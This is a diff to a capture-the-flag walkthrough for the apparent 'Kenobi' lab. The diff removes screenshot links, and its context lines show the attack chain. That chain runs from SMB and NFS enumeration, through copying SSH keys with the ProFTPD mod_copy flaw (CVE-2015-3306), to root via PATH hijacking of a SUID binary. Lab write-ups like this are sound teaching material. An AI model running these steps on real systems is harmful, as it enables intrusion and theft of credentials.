@@ -38,8 +38,6 @@ ping -c 3 $IP
 nmap -sV $IP
 ```
 
-![nmap service scan](./images/01-nmap-scan.png)
-
 The scan showed **7 open ports**, including SSH (22), HTTP (80), RPCbind (111), SMB (445) and ProFTPD on FTP (21) — the three services (SMB, NFS, FTP) that form the attack path.
 
 ---
@@ -54,15 +52,11 @@ Enumerate shares and users with Nmap's SMB scripts:
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
 ```
 
-![SMB share enumeration](./images/02-smb-enum.png)
-
 List the shares with `smbclient`:
 
 ```bash
 smbclient -L $IP
 ```
-
-![smbclient share listing](./images/03-smb-shares.png)
 
 Three shares were found. The `anonymous` share allowed access without credentials:
 
@@ -72,8 +66,6 @@ smbclient //$IP/anonymous
 get log.txt
 ```
 
-![Anonymous SMB access and log.txt retrieval](./images/04-smb-anonymous.png)
-
 `log.txt` confirmed the ProFTPD configuration and the location of Kenobi's SSH keys — useful context for the foothold.
 
 ### Network File System (NFS) — via RPCbind, port 111
@@ -82,8 +74,6 @@ get log.txt
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
 ```
 
-![NFS export enumeration](./images/05-nfs-showmount.png)
-
 The host exports **`/var`** over NFS — a location we can mount and read later.
 
 ### ProFTPD — port 21
@@ -91,8 +81,6 @@ The host exports **`/var`** over NFS — a location we can mount and read later.
 ```bash
 searchsploit ProFTPd 1.3.5
 ```
-
-![searchsploit ProFTPD results](./images/06-searchsploit-proftpd.png)
 
 `searchsploit` returned **4** results for ProFTPD 1.3.5, including the `mod_copy` module — this version is vulnerable to CVE-2015-3306.
 
@@ -116,8 +104,6 @@ searchsploit ProFTPd 1.3.5
    SITE CPTO /var/tmp/id_rsa
    ```
 
-   ![ProFTPD mod_copy via netcat](./images/07-ftp-modcopy.png)
-
 2. Mount the exposed NFS `/var` share locally:
 
    ```bash
@@ -139,8 +125,6 @@ searchsploit ProFTPd 1.3.5
    ssh -i id_rsa kenobi@$IP
    ```
 
-   ![SSH access and user flag](./images/08-user-flag.png)
-
 **Result:** SSH shell as `kenobi`. The user flag is at `/home/kenobi/user.txt`.
 
 **User flag:** `d0b0f3f53b6caa532a83915e19224899`
@@ -155,15 +139,11 @@ searchsploit ProFTPd 1.3.5
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![SUID binary enumeration](./images/09-suid-find.png)
-
 This lists all SUID binaries. A non-standard binary, **`/usr/bin/menu`**, stood out. Running it presented a small menu of options:
 
 ```bash
 /usr/bin/menu
 ```
-
-![Running the menu SUID binary](./images/10-menu-binary.png)
 
 **Vector:** PATH hijacking of the SUID binary `/usr/bin/menu`. The binary calls `curl` **without an absolute path**, so it resolves the command via `$PATH`.
 
@@ -191,8 +171,6 @@ This lists all SUID binaries. A non-standard binary, **`/usr/bin/menu`**, stood 
    /usr/bin/menu
    id
    ```
-
-   ![Root shell and root flag](./images/11-root-flag.png)
 
 **Result:** Root shell (`uid=0`). The root flag is at `/root/root.txt`.
 
